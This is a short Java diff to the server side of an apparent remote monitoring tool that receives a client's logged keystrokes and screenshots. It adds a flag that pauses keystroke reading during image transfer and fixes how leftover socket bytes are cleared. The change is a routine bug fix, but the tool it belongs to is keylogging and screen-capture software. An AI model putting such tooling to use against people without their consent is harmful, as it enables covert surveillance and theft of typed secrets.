@@ -27,6 +27,7 @@ class Connection implements Runnable {
 	private DataOutputStream output;
 
 	private Thread operation;
+	private boolean processingImage;
 
 	/**
 	 * Initializes the connection with the client. Authentication and communication
@@ -44,6 +45,8 @@ class Connection implements Runnable {
 		input = new InputStreamReader(this.connection.getInputStream());
 		output = new DataOutputStream(this.connection.getOutputStream());
 		output.flush();
+		
+		processingImage = false;
 	}
 
 	/**
@@ -129,11 +132,11 @@ class Connection implements Runnable {
 						// Keep listening until thread is interrupted
 						BufferedReader bufferedInput = new BufferedReader(input);
 						while (!Thread.currentThread().isInterrupted()) {
-							if (input.ready()) {
+							if (input.ready() && !processingImage) {
 								String keystroke = bufferedInput.readLine();
 								System.out.print(keystroke);
 								
-								// Adds the logged key to the text area if that's still existant
+								// Adds the logged key to the text area if that's still existent
 								RemoteMonitorServer.addText(keystroke);
 							}
 						}
@@ -169,8 +172,8 @@ class Connection implements Runnable {
 						RemoteMonitorServer.resetPictureArea(screenshot);
 						
 						// Clears the remaining input. Sometimes there's some random crap leftover
-						System.out.println("Clearing " + System.in.available() + " leftover bytes");
-						System.in.skip(System.in.available());
+						System.out.println("Clearing " + connection.getInputStream().available() + " leftover bytes");
+						connection.getInputStream().skip(connection.getInputStream().available());
 						break;
 					}
 				}
